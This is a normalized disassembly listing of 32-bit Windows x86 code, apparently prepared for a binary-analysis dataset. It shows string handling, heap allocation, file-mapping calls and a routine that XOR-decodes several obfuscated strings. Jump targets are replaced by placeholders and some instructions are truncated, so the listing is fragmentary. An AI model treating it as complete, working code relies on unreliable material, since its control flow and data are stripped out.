mov edi eax
test edi edi
jne r-xdata
mov eax [ esi ]
push eax
push 0x0
push 0x0
push 0xf001f
push edi
call [ MapViewOfFile@IAT ]
mov ecx [ ebp - 0x58 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
push ebx
push esi
push eax
mov eax [ ebp + 0xc ]
call sub_10015140
mov edx [ ebp - 0x58 ]
mov eax [ edx ]
mov esi [ ebp - 0x60 ]
mov [ ebp - 0x58 ] edi
add esp 0xc
add esi 0xd4
lea edi [ ebp - 0x5c ]
mov [ ebp - 0x5c ] eax
call sub_10030f80
push eax
push esi
lea esi [ ebp - 0x64 ]
call sub_10005770
xor eax eax
lea edx [ ebp - 0x38 ]
mov eax 0x1c
call sub_10071e30
xor esi esi
xor edx edx
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x54 ] dx
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] esi
lea edx [ eax + 0x2 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_10034100
lea edx [ ebp - 0x54 ]
mov ecx 0xcc
mov [ ebp - 0x4 ] esi
call sub_10022b50
cmp [ ebp - 0x40 ] 0x8
jb r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x54 ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1004f410
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002d290
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
lea edi [ eax + 0x1 ]
mov [ ebp - 0x20 ] edi
push 0x0
push 0x0
push edi
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + esi ]
cmp esi 0x1000
jge r-xdata
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_10021090
add esp 0x4
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_10082fa0
mov [ ebp - 0x18 ] esp
mov eax esp
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
push eax
call sub_1003f6d0
and eax 0xffff
or eax 0x80070000
test ebx ebx
jne r-xdata
push esi
push ebx
push edi
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_1003f6d0
push ebx
call [ SysAllocString@IAT ]
mov edi eax
cmp esi 0x1000
jl r-xdata
cmp esi 0x1000
jl r-xdata
test edi edi
jne r-xdata
push ebx
call sub_1001b2d2
add esp 0x4
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
push ebx
call sub_1001b2d2
add esp 0x4
mov eax edi
push 0x8007000e
call sub_1003f6d0
push eax
call sub_1003f6d0
and eax 0xffff
or eax 0x80070000
sub_1004f58b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_10027667
mov esi [ eax ]
call sub_10027667
cmp esi [ eax ]
jl r-xdata
call sub_1004aab3
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_1004f5e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d60
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
sar eax 0x1
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp sub_1004f650
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_1003afd0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_1004f650
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_10030594
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10045c60
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1004f650
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1004f650
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1004f650
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1004f650
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1004f6ad
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10055e2a
test edi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1004f650
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1004f650
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1004f650
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_1004f650
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1004f756
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
leave
retn
cmp ecx 0x7fffffff
ja r-xdata
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10032538
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10055e2a
lea eax [ ecx + ecx ]
push eax
call sub_1002e3ac
pop ecx
test eax eax
jne r-xdata
sub_1004f7b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008982f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ r--data ]
xor ebx ebx
xor eax eax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x42
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x3e ] ax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffdf
and edx 0xff
mov [ ebp + eax * 2 - 0x70 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x59
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff89
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x48
and edx 0xff
mov [ ebp + eax * 2 - 0x9c ] dx
inc eax
cmp eax 0x15
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x72 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbe
and edx 0xff
mov [ ebp + eax * 2 - 0x180 ] dx
inc eax
cmp eax 0x52
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xdc ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x37
and edx 0xff
mov [ ebp + eax * 2 - 0xd8 ] dx
inc eax
cmp eax 0x1d
jb r-xdata
xor eax eax
push 0xc
lea esi [ ebp - 0x3dc ]
mov [ ebp - 0x9e ] ax
call sub_1001ddf0
add esp 0x4
mov edi eax
push 0xe
lea esi [ ebp - 0x414 ]
mov [ ebp - 0x4 ] ebx
call sub_1001ddf0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x430 ]
mov [ ebp - 0x4 ] 0x1
call sub_100519f0
add esp 0x4
mov ecx eax
mov eax edi
lea edi [ ebp - 0x3a4 ]
mov [ ebp - 0x4 ] 0x2
call sub_1006b070
mov edi 0x8
cmp [ ebp - 0x41c ] edi
jb r-xdata
mov esi 0x7
xor edx edx
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x420 ] ebx
mov [ ebp - 0x430 ] dx
cmp [ ebp - 0x400 ] edi
jb r-xdata
mov ecx [ ebp - 0x430 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x400 ] esi
mov [ ebp - 0x404 ] ebx
mov [ ebp - 0x414 ] cx
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x3c8 ] edi
jb r-xdata
mov eax [ ebp - 0x414 ]
push eax
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x9c ]
xor eax eax
mov [ ebp - 0x3c8 ] esi
mov esi [ ebp - 0x394 ]
push ecx
mov [ ebp - 0x3cc ] ebx
mov [ ebp - 0x3dc ] ax
call [ lstrlenW@IAT ]
lea ebx [ eax + esi + 0x1 ]
mov esi [ GetProcessHeap@IAT ]
lea edx [ ebx + ebx ]
push edx
push edi
call esi
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x4b8 ] edi
test edi edi
je r-xdata
mov edx [ ebp - 0x3dc ]
push edx
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0x390 ] 0x8
jb r-xdata
cmp [ ebp - 0x390 ] 0x8
mov eax [ ebp - 0x3a4 ]
jae r-xdata
xor eax eax
mov eax [ ebp - 0x3a4 ]
push eax
call sub_1000a86e
add esp 0x4
jmp r-xdata
push eax
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx ebx
mov ebx edi
call sub_1006d3c0
add esp 0x8
push 0x144
xor ebx ebx
push ebx
call esi
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4c0 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x3a4 ]
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x388 ]
push ebx
push ecx
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x388 ]
call sub_10063850
test eax eax
je r-xdata
push edi
push ebx
call esi
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x4 ] 0x6
mov esi [ ebp - 0x4a4 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x6
push eax
lea ecx [ ebp - 0x4a8 ]
mov [ ebp - 0x4a8 ] ebx
mov [ ebp - 0x4a4 ] ebx
call sub_100310b0
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x4a8 ] ebx
jne r-xdata
push 0x1
call sub_1002e3ac
add esp 0x4
push eax
lea ecx [ ebp - 0x4b0 ]
mov [ ebp - 0x4b0 ] ebx
mov [ ebp - 0x4ac ] ebx
call sub_10002ce0
mov [ ebp - 0x4 ] 0x9
cmp [ ebp - 0x4b0 ] ebx
jne r-xdata
push edi
push ebx
call esi
push eax
call [ HeapFree@IAT ]
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10039fc0
cmp [ ebp - 0x390 ] 0x8
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
lea eax [ ebp - 0x388 ]
push eax
lea ecx [ ebp - 0x4a8 ]
call sub_1001ee70
test eax eax
jne r-xdata
push edi
push ebx
jmp r-xdata
mov edx [ ebp - 0x3a4 ]
push edx
call sub_1000a86e
add esp 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ebx [ ebp - 0x4a8 ]
mov eax ebx
call sub_1002c600
test eax eax
jne r-xdata
call esi
push eax
call [ HeapFree@IAT ]
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
push edi
push 0x0
mov eax [ ebx + 0x128 ]
mov [ ebp - 0x4bc ] eax
test eax eax
je r-xdata
mov ecx [ rw-data ]
push ecx
lea esi [ ebp - 0x3f8 ]
call sub_1001ddf0
add esp 0x4
lea edx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0x3e8 ]
push edx
call [ lstrlenW@IAT ]
lea esi [ eax + esi + 0x1 ]
lea eax [ esi + esi ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0xd8 ]
push edx
mov ecx esi
call sub_1006d3c0
add esp 0x8
push ebx
lea ecx [ ebp - 0x4a0 ]
call sub_1004a920
mov [ ebp - 0x4b4 ] eax
push edi
lea ecx [ ebp - 0x484 ]
mov [ ebp - 0x4 ] 0xb
call sub_1004a920
push eax
lea edx [ ebp - 0x54 ]
lea esi [ ebp - 0x468 ]
mov [ ebp - 0x4 ] 0xc
call sub_10040e00
add esp 0x4
mov ecx eax
mov eax [ ebp - 0x4b4 ]
lea edi [ ebp - 0x44c ]
mov [ ebp - 0x4 ] 0xd
call sub_1006b070
push eax
lea edx [ ebp - 0x24 ]
lea esi [ ebp - 0x3c0 ]
mov [ ebp - 0x4 ] 0xe
call sub_100519f0
add esp 0x4
mov ecx edi
call sub_100702e0
lea ecx [ ebp - 0x468 ]
call sub_100702e0
lea ecx [ ebp - 0x484 ]
call sub_100702e0
lea ecx [ ebp - 0x4a0 ]
mov [ ebp - 0x4 ] 0x13
call sub_100702e0
mov eax [ ebp - 0x4b8 ]
mov edi [ GetProcessHeap@IAT ]
push eax
push 0x0
call edi
mov esi [ HeapFree@IAT ]
push eax
call esi
push ebx
push 0x0
call edi
push eax
call esi
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea ecx [ ebp - 0x3f8 ]
call sub_100702e0
jmp r-xdata
mov ecx [ ebp - 0x4bc ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edi [ eax + 0xc ]
mov ebx [ eax + 0x4 ]
mov esi [ lstrlenW@IAT ]
mov [ ebp - 0x4b4 ] edx
mov edx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
push ecx
mov [ ebp - 0x4c0 ] edi
mov [ ebp - 0x4c4 ] ecx
mov [ ebp - 0x4c8 ] edx
mov [ ebp - 0x4cc ] eax
call esi
push edi
mov edi eax
call esi
mov ecx [ ebp - 0x4b4 ]
push ecx
add edi eax
call esi
push ebx
add edi eax
call esi
lea edx [ ebp - 0x180 ]
push edx
add edi eax
call esi
lea edi [ eax + edi + 0x7 ]
lea eax [ edi + edi ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x3c0 ]
call sub_100702e0
lea ecx [ ebp - 0x3f8 ]
call sub_100702e0
jmp r-xdata
mov ecx [ ebp - 0x4cc ]
movzx edx [ ebp - 0x4c8 ]
mov eax [ ebp - 0x4c4 ]
push ecx
mov ecx [ ebp - 0x4c0 ]
push edx
mov edx [ ebp - 0x4b4 ]
push eax
push ecx
push edx
push ebx
lea eax [ ebp - 0x180 ]
push eax
mov ecx edi
mov ebx esi
call sub_1006d3c0
add esp 0x1c
lea ecx [ ebp - 0x3c0 ]
push ecx
mov edx esi
call sub_10022250
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0x4bc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4bc ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c0 ]
push eax
lea edx [ ebp - 0x3c ]
call sub_10022250
lea ecx [ ebp - 0x3c0 ]
push ecx
lea edx [ ebp - 0x70 ]
call sub_10022250
mov edx [ ebp - 0x3b0 ]
lea eax [ edx + edx + 0x2 ]
push eax
mov ebx 0x8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0x3c0 ]
cmp [ ebp - 0x3ac ] ebx
jae r-xdata
lea ecx [ ebp - 0x3c0 ]
call sub_100702e0
lea ecx [ ebp - 0x3f8 ]
call sub_100702e0
mov [ ebp - 0x4 ] bl
jmp r-xdata
push eax
push esi
call [ StrCpyW@IAT ]
lea ecx [ ebp - 0x3c0 ]
call sub_100702e0
lea ecx [ ebp - 0x3f8 ]
call sub_100702e0
lea eax [ ebp - 0x4b0 ]
mov [ ebp - 0x4 ] bl
call sub_10039fc0
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10039fc0
lea ecx [ ebp - 0x3a4 ]
call sub_100702e0
mov eax esi
jmp r-xdata
lea eax [ ebp - 0x3c0 ]
lea eax [ ebp - 0x4b0 ]
call sub_10039fc0
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10039fc0
lea ecx [ ebp - 0x3a4 ]
call sub_100702e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1004ff60
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx eax
sub ecx ebx
sar ecx 0x2
mov eax ecx
cdq
sub eax edx
push edi
mov edi eax
sar edi 0x1
mov [ ebp - 0x8 ] ecx
test edi edi
jle r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ edi + edi + 0x2 ]
jmp r-xdata
mov eax [ ebx + edi * 4 - 0x4 ]
dec edi
sub esi 0x2
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] edi
cmp esi ecx
jge r-xdata
jne r-xdata
mov ecx [ ebx + esi * 4 - 0x4 ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x8 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push edi
call sub_10025860
add esp 0xc
test edi edi
jg r-xdata
mov edx [ ebx + ecx * 4 - 0x4 ]
mov eax [ ebp - 0x4 ]
dec ecx
mov [ ebx + eax * 4 ] edx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + esi * 4 ]
mov [ ebp - 0x4 ] esi
lea esi [ esi + esi + 0x2 ]
mov [ ebx + ecx * 4 ] eax
cmp esi [ ebp - 0x8 ]
jl r-xdata
dec esi
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
pop esi
mov ecx [ ebp - 0x8 ]
cmp esi ecx
sub_1004fffe
push 0x10
push r--data
call sub_1007fad0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10050091
mov eax [ ebp - 0x1c ]
call sub_1007fb15
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1003f4d3
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_1001b2d2
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_100500a0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
cmp [ ebx ] 0x0
push edi
mov edi [ rw-data ]
jne r-xdata
add edi 0xd4
push esi
lea eax [ ebp - 0x4 ]
mov ecx edi
call sub_10006910
mov esi [ eax ]
mov eax [ rw-data ]
cmp esi [ eax + 0xd8 ]
jne r-xdata
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
push eax
call [ UnmapViewOfFile@IAT ]
mov ecx [ esi + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
push esi
lea edx [ ebp - 0x4 ]
push edx
push edi
mov [ ebx ] 0x0
call sub_10017710
pop esi
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop esi
pop edi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
sub_10050120
push ebp
mov ebp esp
push 0xffffffff
push sub_1008667f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ ebx ]
jne r-xdata
mov edx [ eax + 0x4 ]
dec [ edx ]
cmp [ edx ] edi
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1002d4a0
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
inc [ ebx ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
lea edx [ ebp - 0x18 ]
lea eax [ esi + 0x28 ]
mov [ ebp - 0x4 ] 0x5
cmp eax edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx edi
je r-xdata
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ebx
inc [ ebx ]
mov eax [ eax ]
cmp eax edi
je r-xdata
push ebx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ esi + 0x2c ]
cmp eax edi
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov ecx [ ebp - 0x18 ]
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
sub_100502c0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0xb0
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1002d970
mov eax esi
mov esp ebp
pop ebp
retn
sub_100502f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp + 0xc ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_100651be
test ecx ecx
je r-xdata
push r--data
call sub_10030594
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ecx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10045c60
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
add eax ebx
add eax [ ebp + 0xc ]
add ecx ebx
push ecx
push eax
call sub_1007ec40
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add esp 0xc
push eax
push ecx
push ebx
mov ecx esi
call sub_10071ec0
